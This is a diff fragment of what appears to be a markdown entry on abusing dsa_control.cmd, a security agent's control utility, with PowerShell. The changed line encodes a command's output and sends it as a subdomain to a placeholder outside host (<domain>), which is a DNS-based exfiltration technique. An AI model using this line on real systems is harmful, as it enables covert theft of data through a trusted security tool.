@@ -10,7 +10,7 @@ $cmd = -join ([System.Text.Encoding]::UTF8.GetBytes((<COMMAND>)) | ForEach-Objec
 ```
 
 ```powershell
-dsa_control.cmd -x "dsm_proxy://$whoami.<domain>:443/"
+dsa_control.cmd -x "dsm_proxy://$cmd.<domain>:443/"
 ```
 
 
